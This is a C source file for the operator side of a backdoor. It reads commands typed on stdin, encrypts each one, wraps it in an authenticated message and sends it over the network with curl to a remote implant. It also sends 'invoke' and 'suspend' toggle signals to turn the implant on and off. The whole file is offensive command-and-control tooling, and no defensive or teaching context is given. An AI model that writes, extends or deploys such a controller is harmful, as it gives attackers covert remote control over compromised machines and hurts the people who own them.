#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <curl/curl.h>

#include "config.h"
#include "constants.h"
#include "logger.h"
#include "crypto.h"
#include "network.h"
#include "message.h"

static char *line = NULL;
static int message_id = 0;

static void toggle_backdoor(int message_id, int command_type)
{
  unsigned char message[MESSAGE_BUF_SIZE], buf[24];

  generate_rand_string(buf, 24);
  craft_message(message, AUTH_HEADER, message_id, command_type, 24, buf, buf);
  send_request(message);
}

static void cleanup()
{
  free(line);
  toggle_backdoor(message_id, TYPE_SUSPEND_BACKDOOR);
  curl_global_cleanup();
  exit(EXIT_SUCCESS);
}

int main()
{
  ssize_t n;
  size_t len = 0;
  int ciphertext_len, command_type, i;
  unsigned char nonce[crypto_secretbox_NONCEBYTES], nonce_hex[crypto_secretbox_NONCEBYTES * 2];
  unsigned char ciphertext_hex[BUF_SIZE * 2], ciphertext[BUF_SIZE];
  unsigned char message[MESSAGE_BUF_SIZE];
  char buf[BUF_SIZE];

  curl_global_init(CURL_GLOBAL_DEFAULT);

  signal(SIGINT, cleanup);

  toggle_backdoor(message_id, TYPE_INVOKE_BACKDOOR);
  message_id++;
  while ((n = getline(&line, &len, stdin)) != -1)
  {
    // remove newline
    line[n - 1] = 0;
    i = 0;
    while (line[i] != ' ' && line[i] != '\0')
    {
      i++; 
    }
    snprintf(buf, sizeof(buf), "%.*s", i, line);
    command_type = get_command_type(buf);
    randombytes_buf(nonce, sizeof(nonce));

    if ((ciphertext_len = encrypt(ciphertext, (unsigned char *)line, len, nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH)) < 0)
    {
      log_error("encrypt");
      continue;
    }

    to_hex(ciphertext, ciphertext_len, ciphertext_hex);
    to_hex(nonce, sizeof(nonce), nonce_hex);
    if (craft_message(message, AUTH_HEADER, message_id, command_type, ciphertext_len, ciphertext_hex, nonce_hex) < 0)
    {
      log_error("craft_message");
      continue;
    }

    send_request(message);
    message_id++;
  }

  cleanup();

  return 0;
}